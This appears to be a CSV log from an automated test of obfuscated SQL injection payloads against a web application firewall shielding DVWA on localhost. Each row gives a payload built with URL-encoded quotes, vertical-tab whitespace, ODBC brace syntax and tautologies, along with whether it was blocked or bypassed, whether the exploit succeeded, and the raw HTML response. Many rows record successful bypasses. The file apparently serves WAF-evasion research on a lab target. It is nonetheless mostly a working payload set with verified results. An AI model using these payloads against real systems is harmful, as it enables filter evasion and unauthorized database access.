Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1.+or+!+{x+(select%0b1)}=1=%0b(not%0b{`if`+1}=1)%0b||%27,Blocked,No,None,Unknown,0.0121,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor+!%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0203,72.05,No,500,
0%27<@=.1+or%0bnot+1=%0b(0)%0bor',Bypassed,No,None,Unknown,0.0411,72.05,No,500,
0'<@!=.1%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0178,72.05,No,500,
0'<@=1.%0bor%0bfalse+is%0bfalse+||',Bypassed,No,None,booleanAtk,0.0468,72.05,No,500,
0%27or+@<@.+or%0bnot%0b{`if`+1}=1=%0b(not+1)+||',Bypassed,No,None,Unknown,0.0286,72.05,No,500,
0%27<@!=1.+or%0bnot%0b{a%0b1}=1=%0b(!+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0176,72.05,No,500,
0'<@!=1.%0b||+!+{x+(select+1)}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0146,72.05,No,500,
0'<@=1+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1)%0bor',Blocked,No,None,Unknown,0.0263,72.3,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor%0b!%0b1=%0b(!%0btrue)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.027,72.3,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bnot+{x%0b(select%0b1)}=1=%0b(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0535,72.3,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not~false)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0252,72.3,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not+{a+1}=1=+(not%0b{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0221,72.3,No,500,
0%27<@=1+or+not~false=+(!~0)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0175,72.32,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||%0bnot+{a%0b1}=1=+(!%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0271,72.35,No,500,
0%27<@!=1+or%0bnot%0b{x+(select+1)}=1=%0b(not%7e0)%0bor%27,Blocked,No,None,Unknown,0.017,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor%0btrue%0blike+{`if`+1}=1+||',Bypassed,No,None,booleanAtk,0.0193,72.35,No,500,
0%27<@=1.+||%0b!%0b{x%0b(select%0b1)}=1=+(!+true)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0314,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0b!~0=+(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.014,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+!+{x%0b(select%0b1)}=1=+(0)+or',Bypassed,No,None,Unknown,0.0258,72.35,No,500,
0%27<@=.1+or%0b!~false=%0b(!%0b{x+(select%0b1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0213,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||%0bnot+{x+(select+1)}=1=+(!+true)+||%27,Blocked,No,None,Unknown,0.0232,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0bnot+{a+1}=1=%0b(!~false)+||',Bypassed,No,None,booleanAtk,0.0469,72.35,No,500,
0'<@=1%0b||+!%0b{`if`+1}=1=+(!+{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0144,72.35,No,500,
0'<@=1%0b||+!+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0195,72.35,No,500,
0'<@=1.+or%0b!%0b{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0178,72.35,No,500,
0%27<@!=.1+or+!%0b{a+1}=1=%0b(not%7e0)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0259,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or+@<@.+||+not+{`if`%0b1}=1=+(!%7efalse)+or%27,Bypassed,No,None,booleanAtk,0.0171,72.35,No,500,
0'<@!=1%0b||%0bnot%0b{x+(select+1)}=1=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0234,72.35,No,500,
0'<@!=1+||+!%0b1=+(!%0b{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0158,72.35,No,500,
0'<@=1.+or%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0225,72.35,No,500,
0%27<@=1%0b||%0bnot~false=+(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0225,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0b!+{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0181,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x%0b(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0173,72.35,No,500,
0%27||+1<@.%0bor%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0404,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b!%0b{`if`%0b1}=1=+(not%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0307,72.05,No,500,
0'<@!=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0384,72.05,No,500,
0%27<@!=1+||%0b{x%0b(select%0b1)}=1%0blike%0b{`if`%0b1}=1%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0284,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+{`if`%0b1}=1=+(not+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0327,72.05,No,500,
0'<@!=1.+or+not+{x+(select+1)}=1=%0b(not+{`if`+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0065,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||+not+{x+(select+1)}=1=+(!%0b{`if`+1}=1)+or',Blocked,No,None,Unknown,0.0273,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or%0b{x%0b(select+1)}=1+like+{`if`+1}=1+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0344,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0bnot~false=+(not%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.016,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not+{x%0b(select+1)}=1=+(not~false)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.02,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0b!+{`if`%0b1}=1=+(!%0b1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0156,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+!%0b{`if`+1}=1=%0b(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0326,72.05,No,500,
0%27<@!=.1%0bor%0b!+{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0171,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||%0b!~0=+(not%7efalse)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0327,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||%0bnot+{x%0b(select+1)}=1=+(!+1)%0b||',Bypassed,No,None,Unknown,0.0171,72.05,No,500,
0%27<@!=.1+or+!+{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)+or',Blocked,No,None,Unknown,0.0278,72.05,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0b||%0b!+{x+(select+1)}=1=+(!+{`if`+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0126,72.05,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+not+{a%0b1}=1=+(!%0b1)%0bor',Bypassed,No,None,Unknown,0.027,72.05,No,500,
0'<@!=.1%0b||+!+{a+1}=1=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0141,72.05,No,500,
0%27<@!=.1+||+!+{`if`+1}=1=+(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0227,72.05,No,500,
0%27<@=1%0b||%0bnot+true=+(!%0b{x+(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0417,72.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||%0b!~false=+(!+{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0333,72.3,No,500,
0%27<@=.1+or+!%0b{`if`+1}=1=%0b(!+{a+1}=1)+or',Bypassed,No,None,Unknown,0.0308,72.3,No,500,
0%27<@=1+||+!%0b{`if`+1}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0257,72.3,No,500,
0'<@!=1%0bor%0b{a+1}=1%0blike%0b{a+1}=1%0b||%27,Bypassed,No,None,Unknown,0.0207,72.3,No,500,
0'<@=1+||+!%0b{x+(select+1)}=1=%0b(!+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0182,72.3,No,500,
0%27<@=1.+||+!+{a%0b1}=1=%0b(!+{a%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0212,72.32,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+!%0b{`if`+1}=1=+(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0418,72.35,No,500,
0'<@!=1.%0b||+{`if`+1}=1+like+{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.024,72.35,No,500,
0'<@=.1+||%0b!+{`if`%0b1}=1=+(!%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0476,72.35,No,500,
0%27<@!=.1+or%0bnot+{x+(select+1)}=1=+(!+1)+or%27,Blocked,No,None,Unknown,0.0161,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0bor%0bnot+{a+1}=1=%0b(not%0btrue)+||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.027,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+!+{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0182,72.35,No,500,
0%27<@!=1.+||%0b{a+1}=1+like+{x%0b(select+1)}=1%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0368,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+0=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0322,72.35,No,500,
0'<@!=1.+||+!%0b{x+(select%0b1)}=1=%0b(0)+or%27,Bypassed,No,None,Unknown,0.038,72.35,No,500,
0'<@!=1.%0bor+not%0b1=+(!+{x%0b(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0253,72.35,No,500,
0'<@!=1.%0bor+not+{x%0b(select+1)}=1=+(!~0)--%0b,Bypassed,No,None,piggyAtk,0.0263,72.35,No,500,
0%27<@!=1.%0bor+{x%0b(select+1)}=1%0blike%0b{`if`+1}=1+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0225,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||+!%0b{x+(select%0b1)}=1=+(!%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.018,72.35,No,500,
0'<@!=1.%0bor+!%0b{x+(select%0b1)}=1=%0b(not+{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0129,72.35,No,500,
0%27<@=.1%0bor%0b{x+(select%0b1)}=1%0blike+{x+(select+1)}=1+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0116,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0b!+true=%0b(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,booleanAtk,0.0293,72.35,No,500,
0'<@=.1%0b||+!+{x+(select+1)}=1=+(!~0)%0b||%27,Bypassed,No,None,Unknown,0.0274,72.35,No,500,
0%27<@=1+or+not+{x+(select+1)}=1=+(0)%23,Blocked,No,None,piggyAtk,0.0166,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1%0bor+not+{x+(select+1)}=1=+(!+{`if`%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0123,72.35,No,500,
0%27<@!=1.%0bor%0bnot+{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0357,72.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b{a%0b1}=1%0blike+{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0346,72.35,No,500,
0'<@!=.1+||+not%0b{a+1}=1=+(!+true)+or',Blocked,No,None,booleanAtk,0.0203,72.35,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
